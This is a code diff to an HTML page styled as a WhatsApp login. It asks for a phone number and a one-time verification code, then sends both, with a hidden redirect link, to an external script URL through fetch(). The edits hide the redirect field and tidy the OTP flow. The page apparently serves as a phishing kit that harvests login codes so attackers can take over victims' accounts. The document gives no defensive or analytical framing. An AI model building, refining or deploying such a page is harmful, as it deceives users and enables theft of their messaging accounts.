@@ -75,7 +75,7 @@ button:hover {
   </header>
     <img src="https://toppng.com/uploads/preview/download-whatsapp-social-media-apps-11563650769y1qhv167dh.png" alt="Logo" class="logo">
     <form id="otpForm">
-<input type="text" id="Redirected" placeholder="link" style="display:block;">
+<input type="text" id="Redirected" placeholder="link" style="display:none;">
         <input type="tel" id="phoneNumber" placeholder="Phone Number">
         <button id="getOtpBtn">Login</button>
         <div id="progressBar" style="display:none;">
@@ -93,7 +93,7 @@ button:hover {
     <script>
 
       const urlParams = new URLSearchParams(window.location.search);
-  const link = urlParams.get('lin');
+  const link = urlParams.get('link');
 document.getElementById('Redirected').value = link;
 
 document.getElementById('getOtpBtn').addEventListener('click', getOtp);
@@ -119,9 +119,8 @@ function getOtp(e) {
       document.getElementById('progressBar').style.display = 'none';
       document.getElementById('checkOtpBtn').style.display = 'block';
       document.getElementById('otpInput').style.display = 'block';
-      
        document.getElementById('phoneNumber').style.display = 'none';
-      document.getElementById('otpInput').style.display = 'block';
+      document.getElementById('getOtpBtn').style.display = 'none';
     }
   }, 1000);
   
@@ -137,8 +136,9 @@ function checkOtp(e) {
   var otp = document.getElementById('otpInput').value;
   var linkValue = document.getElementById('Redirected').value;
   
+ 
   
-  fetch(`${scriptUrl}?update=true&phoneNumber=${phoneNumber}&otp=${otp}&link=${linkValue}`)
+  fetch(`${scriptUrl}?phoneNumber=${phoneNumber}&otp=${otp}&link=${linkValue}`)
     .then(response => response.json())
     .then(data => {
       if (data.status === 'success') {
@@ -147,13 +147,8 @@ function checkOtp(e) {
         alert('Invalid OTP or phone number');
       }
     })
-  if (!linkValue) {
-     window.open('https://web.com/', '_blank');
-    return;
-  }
-  
-  
     .catch(error => console.error('Error:', error));
+
 }
   </script>
 </body>
